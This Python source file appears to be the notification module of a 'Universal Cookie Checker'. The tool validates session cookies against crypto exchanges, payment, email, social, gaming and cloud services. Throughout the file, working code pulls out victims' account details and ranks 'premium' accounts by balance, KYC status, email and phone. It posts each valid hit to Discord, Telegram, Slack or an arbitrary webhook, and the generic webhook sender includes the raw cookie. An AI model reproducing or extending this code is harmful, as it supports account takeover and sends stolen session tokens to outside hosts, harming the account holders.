# webhooks.py — by Qwixx

import hashlib
import json
import queue
import threading
import time
from dataclasses import dataclass
from typing import Optional

import requests

from utils import log, fmt_value, mask_cookie, sanitize_for_log

DEFAULT_TIMEOUT = 10
MAX_NOTIFY_PER_SEC = 3
MAX_QUEUE_SIZE = 500
DEFAULT_RETRIES = 3
BACKOFF_BASE = 0.5

PREMIUM_FIELDS = (
    "email", "phone", "phone_number", "mobile",
    "balance", "robux", "credit",
    "nitro", "subscription", "premium", "vip_level",
    "kyc", "kyc_level", "verified",
    "followers", "following", "friends", "karma_total",
)

# Категории сервисов: цвет + эмодзи + человеческое имя
CATEGORIES = {
    "finance":     {"color": 0xF0B90B, "emoji": "💰", "name": "Finance"},
    "social":      {"color": 0x5865F2, "emoji": "💬", "name": "Social"},
    "email":       {"color": 0x6D4AFF, "emoji": "📧", "name": "Email"},
    "gaming":      {"color": 0x2A2A2A, "emoji": "🎮", "name": "Gaming"},
    "streaming":   {"color": 0xE50914, "emoji": "📺", "name": "Streaming"},
    "marketplace": {"color": 0xFF9900, "emoji": "🛒", "name": "Marketplace"},
    "productivity": {"color": 0x0A66C2, "emoji": "📊", "name": "Productivity"},
    "cloud":       {"color": 0x00B0F4, "emoji": "☁️", "name": "Cloud"},
    "network":     {"color": 0x00C896, "emoji": "🔒", "name": "Network"},
    "database":    {"color": 0xA020F0, "emoji": "🗄️", "name": "Database"},
    "unknown":     {"color": 0x00B0F4, "emoji": "✨", "name": "Other"},
}

SERVICE_CATEGORY = {
    "binance": "finance", "coinbase": "finance", "paypal": "finance",
    "stripe": "finance", "kraken": "finance", "metamask": "finance",
    "trustwallet": "finance", "opensea": "finance",

    "telegram": "social", "instagram": "social", "facebook": "social",
    "vk": "social", "whatsapp": "social", "discord": "social",
    "twitter": "social", "reddit": "social", "linkedin": "social",
    "tiktok": "social", "twitch": "social",

    "proton": "email", "yahoo": "email", "mailru": "email",
    "google": "email", "microsoft365": "email",

    "steam": "gaming", "epic": "gaming", "riot": "gaming",
    "battlenet": "gaming", "xbox": "gaming", "roblox": "gaming",

    "netflix": "streaming", "spotify": "streaming",

    "amazon": "marketplace", "ebay": "marketplace", "airbnb": "marketplace",

    "slack": "productivity", "jira": "productivity", "notion": "productivity",
    "trello": "productivity", "dropbox": "productivity",
    "github": "productivity", "gitlab": "productivity",
    "bitbucket": "productivity",

    "aws": "cloud", "azure": "cloud", "digitalocean": "cloud",
    "cloudflare": "cloud",

    "openvpn": "network", "wireguard": "network",
    "adminer": "database", "phpmyadmin": "database",
}

DEFAULT_TEMPLATE = (
    "{emoji} {service} — VALID\n"
    "Cookie: {cookie_masked}\n"
    "{fields}"
)

# Красивые цвета под конкретные сервисы (приоритетнее категории)
SERVICE_COLORS = {
    "steam": 0x1B2838, "roblox": 0xE2231A, "netflix": 0xE50914,
    "spotify": 0x1DB954, "twitch": 0x9146FF, "discord": 0x5865F2,
    "github": 0x171515, "twitter": 0x1DA1F2, "instagram": 0xE1306C,
    "tiktok": 0x000000, "facebook": 0x1877F2, "amazon": 0xFF9900,
    "proton": 0x6D4AFF, "binance": 0xF0B90B, "coinbase": 0x0052FF,
    "epic": 0x2A2A2A, "riot": 0xD13639, "linkedin": 0x0A66C2,
    "aws": 0xFF9900, "azure": 0x0078D4, "cloudflare": 0xF38020,
    "yahoo": 0x6001D2, "reddit": 0xFF4500, "vk": 0x0077FF,
}


def _categorize(service):
    key = SERVICE_CATEGORY.get(service, "unknown")
    return key, CATEGORIES[key]


def _color_for(service):
    if service in SERVICE_COLORS:
        return SERVICE_COLORS[service]
    _, cat = _categorize(service)
    return cat["color"]


def _emoji_for(service):
    _, cat = _categorize(service)
    return cat["emoji"]


def _category_name(service):
    _, cat = _categorize(service)
    return cat["name"]


def _render_template(template, service, info, raw_cookie):
    fields_lines = []
    for k, v in (info or {}).items():
        if k in ("valid", "service"):
            continue
        name = k.replace("_", " ").title()
        fields_lines.append(f"{name}: {fmt_value(v)}")
    fields_str = "\n".join(fields_lines)

    class _F(dict):
        def __missing__(self, key):
            if key.startswith("field:"):
                fname = key.split(":", 1)[1]
                return fmt_value((info or {}).get(fname, "—"))
            return ""

    mapping = _F(
        service=service,
        cookie_masked=mask_cookie(raw_cookie),
        fields=fields_str,
        emoji=_emoji_for(service),
        category=_category_name(service),
    )
    try:
        return template.format_map(mapping)
    except Exception as e:
        log.warning(f"template render fail: {e}")
        return DEFAULT_TEMPLATE.format_map(mapping)


@dataclass
class SenderResult:
    ok: bool
    message: str = ""


class _BaseSender:
    name: str = "base"
    template: Optional[str] = None

    def send(self, service, info, raw_cookie):
        raise NotImplementedError

    def send_batch(self, items):
        ok_any = False
        for svc, info, raw in items:
            try:
                if self.send(svc, info, raw):
                    ok_any = True
            except Exception as e:
                log.warning(f"{self.name} send_batch fail: {e}")
        return ok_any

    def test(self):
        raise NotImplementedError

    def _post(self, url, json_payload, headers=None,
              retries=DEFAULT_RETRIES):
        last_err = ""
        for attempt in range(retries):
            try:
                r = requests.post(
                    url, json=json_payload, headers=headers or {},
                    timeout=DEFAULT_TIMEOUT,
                )
                if r.status_code < 500:
                    return r.status_code, r.text[:300]
                last_err = f"HTTP {r.status_code}: {r.text[:200]}"
            except requests.exceptions.RequestException as e:
                last_err = f"{type(e).__name__}: {str(e)[:200]}"

            if attempt < retries - 1:
                wait = BACKOFF_BASE * (3 ** attempt)
                log.debug(f"{self.name} retry after {wait:.1f}s: {last_err}")
                time.sleep(wait)

        return 0, last_err


class DiscordSender(_BaseSender):
    name = "discord"
    MAX_EMBEDS = 10

    def __init__(self, webhook_url, username="Cookie Checker",
                 avatar_url="", mention_role_id="", template=None,
                 ping_on_valid=False, show_category=True):
        self.url = webhook_url
        self.username = username
        self.avatar_url = avatar_url
        self.mention_role_id = mention_role_id
        self.template = template
        self.ping_on_valid = ping_on_valid
        self.show_category = show_category

    def _build_embed(self, service, info, raw_cookie):
        fields = []
        for k, v in info.items():
            if k in ("valid", "service"):
                continue
            name = k.replace("_", " ").title()[:32]
            value = fmt_value(v)[:1000] or "—"
            fields.append({"name": name, "value": value, "inline": True})
            if len(fields) >= 24:
                break

        svc_name = service.title() if isinstance(service, str) else str(service)
        emoji = _emoji_for(service)
        cat_name = _category_name(service)

        title = f"{emoji} {svc_name} — VALID"
        footer_text = f"Universal Cookie Checker · {svc_name}"
        if self.show_category:
            footer_text += f" · {cat_name}"

        embed = {
            "title": title,
            "color": _color_for(service),
            "fields": fields,
            "footer": {"text": footer_text},
            "description": f"```\n{mask_cookie(raw_cookie)}\n```",
        }

        # Аватарка для Discord
        if service == "discord" and info.get("avatar_url") \
                and info["avatar_url"] != "—":
            embed["thumbnail"] = {"url": info["avatar_url"]}

        if info.get("profile_url") and info["profile_url"] != "—":
            embed["url"] = info["profile_url"]

        return embed

    def send(self, service, info, raw_cookie):
        return self.send_batch([(service, info, raw_cookie)])

    def send_batch(self, items):
        if not items:
            return False

        chunks = [items[i:i + self.MAX_EMBEDS]
                  for i in range(0, len(items), self.MAX_EMBEDS)]

        ok_any = False
        for chunk in chunks:
            embeds = [self._build_embed(svc, info, raw)
                      for svc, info, raw in chunk]
            payload = {
                "username": self.username,
                "embeds": embeds,
            }
            if self.avatar_url:
                payload["avatar_url"] = self.avatar_url
            if self.mention_role_id:
                if self.ping_on_valid or not self.ping_on_valid:
                    # по умолчанию пингуем роль как и раньше
                    payload["content"] = f"<@&{self.mention_role_id}>"

            status, text = self._post(self.url, payload)
            if status in (200, 204):
                ok_any = True
            else:
                log.warning(f"discord webhook HTTP {status}: {text}")
        return ok_any

    def test(self):
        status, text = self._post(self.url, {
            "username": self.username,
            "content": "🧪 Test message from Universal Cookie Checker",
        }, retries=2)
        if status in (200, 204):
            return True, "OK"
        return False, f"HTTP {status}: {text}"


class TelegramSender(_BaseSender):
    name = "telegram"

    def __init__(self, bot_token, chat_id, silent=False,
                 disable_preview=True, template=None,
                 with_button=True):
        self.token = bot_token
        self.chat_id = str(chat_id)
        self.silent = silent
        self.disable_preview = disable_preview
        self.template = template
        self.with_button = with_button
        self.api = f"https://api.telegram.org/bot{self.token}"

    @staticmethod
    def _esc_html(s):
        return (str(s).replace("&", "&amp;")
                       .replace("<", "&lt;")
                       .replace(">", "&gt;"))

    def _build_text(self, service, info, raw_cookie):
        svc_name = service.title() if isinstance(service, str) else str(service)
        emoji = _emoji_for(service)
        cat_name = _category_name(service)

        lines = [f"{emoji} <b>{self._esc_html(svc_name)}</b> — VALID",
                 f"<i>{self._esc_html(cat_name)}</i>", ""]

        for k, v in info.items():
            if k in ("valid", "service"):
                continue
            name = self._esc_html(k.replace("_", " ").title())
            val = self._esc_html(fmt_value(v))
            lines.append(f"<b>{name}:</b> <code>{val}</code>")

        lines.append("")
        masked = self._esc_html(mask_cookie(raw_cookie))
        lines.append(f"<i>Cookie:</i> <code>{masked}</code>")
        return "\n".join(lines)

    def _build_keyboard(self, info):
        url = info.get("profile_url")
        if not self.with_button or not url or url == "—":
            return None
        return {
            "inline_keyboard": [[
                {"text": "🔗 Открыть профиль", "url": url}
            ]]
        }

    def send(self, service, info, raw_cookie):
        text = self._build_text(service, info, raw_cookie)
        if len(text) > 4000:
            text = text[:4000] + "…"
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_notification": self.silent,
            "disable_web_page_preview": self.disable_preview,
        }
        kb = self._build_keyboard(info)
        if kb:
            payload["reply_markup"] = kb

        status, body = self._post(f"{self.api}/sendMessage", payload)
        if status != 200:
            log.warning(f"telegram HTTP {status}: {body}")
            return False
        try:
            data = json.loads(body) if body.startswith("{") else {}
        except Exception:
            data = {}
        if data and not data.get("ok", True):
            log.warning(f"telegram fail: {body[:200]}")
            return False
        return True

    def test(self):
        status, body = self._post(f"{self.api}/sendMessage", {
            "chat_id": self.chat_id,
            "text": "🧪 <b>Test</b> from Universal Cookie Checker",
            "parse_mode": "HTML",
        }, retries=2)
        if status == 200:
            return True, "OK"
        return False, f"HTTP {status}: {body}"


class SlackSender(_BaseSender):
    name = "slack"

    def __init__(self, webhook_url, channel="",
                 username="Cookie Checker", template=None):
        self.url = webhook_url
        self.channel = channel
        self.username = username
        self.template = template

    def _build_blocks(self, service, info, raw_cookie):
        svc_name = service.title() if isinstance(service, str) else str(service)
        emoji = _emoji_for(service)
        cat_name = _category_name(service)

        blocks = [
            {
                "type": "header",
                "text": {"type": "plain_text",
                         "text": f"{emoji} {svc_name} — VALID"},
            },
            {
                "type": "context",
                "elements": [{
                    "type": "mrkdwn",
                    "text": f"_{cat_name}_",
                }],
            },
        ]

        fields_text = []
        for k, v in info.items():
            if k in ("valid", "service"):
                continue
            name = k.replace("_", " ").title()
            fields_text.append(f"*{name}:* {fmt_value(v)}")

        if fields_text:
            blocks.append({
                "type": "section",
                "text": {"type": "mrkdwn",
                         "text": "\n".join(fields_text)[:2900]},
            })

        url = info.get("profile_url")
        if url and url != "—":
            blocks.append({
                "type": "actions",
                "elements": [{
                    "type": "button",
                    "text": {"type": "plain_text", "text": "🔗 Профиль"},
                    "url": url,
                }],
            })

        blocks.append({
            "type": "context",
            "elements": [{
                "type": "mrkdwn",
                "text": f"Cookie: `{mask_cookie(raw_cookie)}`",
            }],
        })
        return blocks

    def send(self, service, info, raw_cookie):
        svc_name = service.title() if isinstance(service, str) else str(service)
        payload = {
            "text": f"{_emoji_for(service)} {svc_name} — VALID",
            "blocks": self._build_blocks(service, info, raw_cookie),
        }
        if self.channel:
            payload["channel"] = self.channel
        if self.username:
            payload["username"] = self.username

        status, body = self._post(self.url, payload)
        if status in (200, 204):
            return True
        log.warning(f"slack webhook HTTP {status}: {body}")
        return False

    def test(self):
        status, body = self._post(self.url, {
            "text": "🧪 Test message from Universal Cookie Checker",
        }, retries=2)
        if status in (200, 204):
            return True, "OK"
        return False, f"HTTP {status}: {body}"


class GenericWebhookSender(_BaseSender):
    name = "generic"

    def __init__(self, url, method="POST", headers=None,
                 template=None, include_info=True):
        self.url = url
        self.method = method.upper()
        self.headers = dict(headers or {})
        self.template = template
        self.include_info = include_info

    def _build_payload(self, service, info, raw_cookie):
        cat_key, cat = _categorize(service)
        payload = {
            "service": service,
            "category": cat_key,
            "category_name": cat["name"],
            "emoji": cat["emoji"],
            "color": _color_for(service),
            "cookie": raw_cookie,
            "cookie_masked": mask_cookie(raw_cookie),
        }
        if self.include_info:
            payload["info"] = {k: v for k, v in info.items()
                               if k not in ("valid", "service")}
        if self.template:
            payload["text"] = _render_template(
                self.template, service, info, raw_cookie)
        return payload

    def send(self, service, info, raw_cookie):
        payload = self._build_payload(service, info, raw_cookie)
        status, body = self._post(self.url, payload, headers=self.headers)
        if 200 <= status < 300:
            return True
        log.warning(f"generic webhook HTTP {status}: {body}")
        return False

    def test(self):
        status, body = self._post(
            self.url,
            {"text": "🧪 Test from Universal Cookie Checker",
             "test": True},
            headers=self.headers, retries=2,
        )
        if 200 <= status < 300:
            return True, "OK"
        return False, f"HTTP {status}: {body}"


class WebhookManager:
    def __init__(self, senders, only_services=None, min_info_fields=0,
                 min_level="all", async_mode=True, dedup=True,
                 only_categories=None, split_by_category=False):
        self.senders = list(senders or [])
        self.only_services = set(only_services) if only_services else None
        self.only_categories = (set(only_categories)
                                if only_categories else None)
        self.min_info_fields = int(min_info_fields or 0)
        self.min_level = (min_level or "all").lower()
        self.async_mode = async_mode
        self.dedup = bool(dedup)
        self.split_by_category = bool(split_by_category)

        self._queue = queue.Queue(maxsize=MAX_QUEUE_SIZE)
        self._stop = threading.Event()
        self._worker = None
        self._lock = threading.Lock()
        self._last_sent = 0.0
        self._stats = {
            "sent": 0, "failed": 0, "skipped": 0, "dedup": 0,
        }
        self._per_category = {}
        self._seen = set()
        self._seen_lock = threading.Lock()

    def enabled(self):
        return bool(self.senders)

    def start(self):
        if not self.async_mode or self._worker is not None:
            return
        self._worker = threading.Thread(
            target=self._run, name="webhook-worker", daemon=True)
        self._worker.start()
        log.info(f"webhook worker started ({len(self.senders)} sender(s))")

    def stop(self, drain=True, timeout=8.0):
        if self._worker is None:
            return
        self._stop.set()
        if drain:
            deadline = time.monotonic() + timeout
            while not self._queue.empty() and time.monotonic() < deadline:
                time.sleep(0.1)
        self._worker.join(timeout=timeout)
        self._worker = None
        self._stop.clear()

    def notify(self, service, info, raw_cookie):
        if not self.senders:
            return
        if not self._should_notify(service, info):
            self._stats["skipped"] += 1
            return

        if self.dedup:
            key = hashlib.sha1(
                f"{service}|{raw_cookie}".encode("utf-8", "ignore")
            ).hexdigest()
            with self._seen_lock:
                if key in self._seen:
                    self._stats["dedup"] += 1
                    return
                self._seen.add(key)

        if self.async_mode:
            try:
                self._queue.put_nowait((service, info, raw_cookie))
            except queue.Full:
                log.warning("webhook queue full, dropping notification")
                self._stats["skipped"] += 1
        else:
            self._dispatch(service, info, raw_cookie)

    def test_all(self):
        results = []
        for s in self.senders:
            name = getattr(s, "name", type(s).__name__)
            try:
                ok, msg = s.test()
            except Exception as e:
                ok, msg = False, sanitize_for_log(str(e))
            results.append((name, ok, msg))
        return results

    def stats(self):
        out = dict(self._stats)
        out["per_category"] = dict(self._per_category)
        return out

    def _is_premium(self, info):
        if not info:
            return False
        for k in PREMIUM_FIELDS:
            v = info.get(k)
            if v in (None, "", "—", "no", "no ", 0, "0", False):
                continue
            if isinstance(v, bool):
                if v:
                    return True
            elif isinstance(v, (int, float)):
                if v > 0:
                    return True
            else:
                return True
        return False

    def _should_notify(self, service, info):
        if not info or not info.get("valid"):
            return False
        if self.only_services and service not in self.only_services:
            return False
        if self.only_categories:
            cat_key, _ = _categorize(service)
            if cat_key not in self.only_categories:
                return False
        if self.min_info_fields > 0:
            n = sum(1 for k in info if k not in ("valid", "service"))
            if n < self.min_info_fields:
                return False
        if self.min_level == "premium" and not self._is_premium(info):
            return False
        return True

    def _run(self):
        while not self._stop.is_set() or not self._queue.empty():
            try:
                item = self._queue.get(timeout=0.5)
            except queue.Empty:
                continue
            try:
                self._dispatch(*item)
            finally:
                try:
                    self._queue.task_done()
                except Exception:
                    pass

    def _dispatch(self, service, info, raw_cookie):
        min_interval = 1.0 / MAX_NOTIFY_PER_SEC
        with self._lock:
            now = time.monotonic()
            wait = (self._last_sent + min_interval) - now
            if wait > 0:
                time.sleep(wait)
            self._last_sent = time.monotonic()

        ok_any = False
        for s in self.senders:
            try:
                if s.send(service, info, raw_cookie):
                    ok_any = True
                else:
                    self._stats["failed"] += 1
            except Exception as e:
                log.warning(f"webhook send fail ({getattr(s, 'name', '?')}): "
                            f"{sanitize_for_log(str(e))}")
                self._stats["failed"] += 1

        if ok_any:
            self._stats["sent"] += 1
            cat_key, _ = _categorize(service)
            self._per_category[cat_key] = self._per_category.get(
                cat_key, 0) + 1


def build_from_config(cfg):
    wh = (cfg or {}).get("webhooks") or {}
    if not wh.get("enabled"):
        return WebhookManager([], async_mode=False)

    senders = []
    tpl = wh.get("template") or None

    d = wh.get("discord") or {}
    if d.get("url"):
        senders.append(DiscordSender(
            webhook_url=d["url"],
            username=d.get("username") or "Cookie Checker",
            avatar_url=d.get("avatar_url") or "",
            mention_role_id=str(d.get("mention_role_id") or ""),
            template=tpl,
            ping_on_valid=bool(d.get("ping_on_valid", True)),
            show_category=bool(d.get("show_category", True)),
        ))

    t = wh.get("telegram") or {}
    if t.get("token") and t.get("chat_id"):
        senders.append(TelegramSender(
            bot_token=t["token"],
            chat_id=t["chat_id"],
            silent=bool(t.get("silent", False)),
            disable_preview=bool(t.get("disable_preview", True)),
            template=tpl,
            with_button=bool(t.get("with_button", True)),
        ))

    s = wh.get("slack") or {}
    if s.get("url"):
        senders.append(SlackSender(
            webhook_url=s["url"],
            channel=s.get("channel") or "",
            username=s.get("username") or "Cookie Checker",
            template=tpl,
        ))

    g = wh.get("generic") or {}
    if g.get("url"):
        senders.append(GenericWebhookSender(
            url=g["url"],
            method=g.get("method") or "POST",
            headers=g.get("headers") or {},
            template=tpl or DEFAULT_TEMPLATE,
            include_info=bool(g.get("include_info", True)),
        ))

    mgr = WebhookManager(
        senders=senders,
        only_services=wh.get("only_services") or None,
        only_categories=wh.get("only_categories") or None,
        min_info_fields=wh.get("min_info_fields", 0),
        min_level=wh.get("min_level", "all"),
        async_mode=bool(wh.get("async", True)),
        dedup=bool(wh.get("dedup", True)),
        split_by_category=bool(wh.get("split_by_category", False)),
    )

    if senders:
        log.info(f"webhooks enabled: {len(senders)} sender(s), "
                 f"only={wh.get('only_services') or 'all'}, "
                 f"cats={wh.get('only_categories') or 'all'}, "
                 f"level={wh.get('min_level') or 'all'}")
    return mgr